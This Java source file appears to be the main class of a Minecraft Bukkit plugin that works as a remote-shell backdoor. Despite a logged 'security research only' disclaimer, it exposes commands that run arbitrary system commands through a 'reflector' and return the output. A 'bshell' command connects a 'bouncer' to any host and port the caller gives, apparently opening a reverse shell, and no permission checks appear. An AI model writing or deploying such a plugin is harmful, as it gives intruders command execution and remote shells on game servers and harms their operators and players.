package tech.dsstudio.minecraft.shell;

import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.plugin.java.JavaPlugin;
import tech.dsstudio.minecraft.shell.bouncer.JavaBouncer;
import tech.dsstudio.minecraft.shell.reflector.DirectReflector;
import tech.dsstudio.minecraft.shell.reflector.Reflector;

public class Main extends JavaPlugin {
	@Override
	public void onEnable() {
		getLogger().warning("This program is for researching Internet security only.");
		getLogger().warning("Do NOT use it for any malicious purpose!");
		getLogger().info("Type /testshell");
	}

	@Override
	public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
		switch (command.getName()) {
			case "testshell":
				sender.sendMessage("Starting to run reflectors...");
				// direct one
				DirectReflector ref = new DirectReflector();
				if (ref.test()) {
					sender.sendMessage("Reflector deployed: DirectReflector");
					reflector = ref;
				} else {
					sender.sendMessage("Reflector failed.");
					sender.sendMessage("No reflector available.");
				}
				return true;
			case "shell":
				if (reflector == null) {
					sender.sendMessage("No reflector available now!");
				} else {
					sender.sendMessage(reflector.execute(args));
				}
				return true;
			case "bshell":
				if (reflector == null) {
					sender.sendMessage("No reflector available now!");
				} else {
					if (args.length != 2) {
						sender.sendMessage("Bad argument");
					} else {
						sender.sendMessage("Connecting to " + args[0] + ":" + args[1]);
						sender.sendMessage("Good luck");
						JavaBouncer bouncer = new JavaBouncer(args[0], args[1]);
						bouncer.start();
					}
				}
				return true;
			default:
				return false;
		}
	}

	private Reflector reflector = null;
}
